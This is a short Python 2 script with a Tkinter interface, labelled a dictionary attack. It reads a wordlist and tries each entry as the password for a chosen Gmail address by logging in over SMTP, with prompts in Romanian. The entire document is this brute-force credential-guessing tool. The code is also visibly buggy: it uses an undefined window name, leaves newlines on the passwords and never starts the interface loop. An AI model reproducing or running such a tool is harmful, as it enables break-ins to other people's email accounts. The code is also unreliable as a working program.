
# == DICTIONARY ATTACK == #

# import module
from Tkinter import *
from tkFileDialog import *
import smtplib
from tkMessageBox import *

#get all informations function and attack
def attack():
	filename = askopenfilename(title="Selectati fisierul dictionar.",filetypes=[('txt files','.txt'),('all files','.*')])
	fisier = open(filename, "r")
	continut = fisier.readlines()
	numfisier = fisier.name
	fisier.close()
	Label(fenetre, text=numfisier).pack(padx=10, pady=10)
	mail = entree.get()

# SMTP connect
	smtpconnect = smtplib.SMTP("smtp.gmail.com",587)
	smtpconnect.ehlo()
	smtpconnect.starttls()
	for i in continut:
		print i
		try:
			smtpconnect.login(mail,i)
			mdp = i
			showwarning("cuvantul oferit e ",i)
			break
		except smtplib.SMTPAuthenticationError:
			print "cuvantul oferit a esuat"

#UI creation
fereastra = Tk()
label = Label(fereastra,text="Etapa 1 - Introduceti adresa de email.")
label.pack()

value=StringVar()
value.set("Etapa 1 - Introduceti adresa de email.")
entree = Entry(fereastra, textvariable='string', width=30)
entree.pack()

button=Button(fereastra, text="Etapa 2 - Continuati.", command=attack)
button.pack()
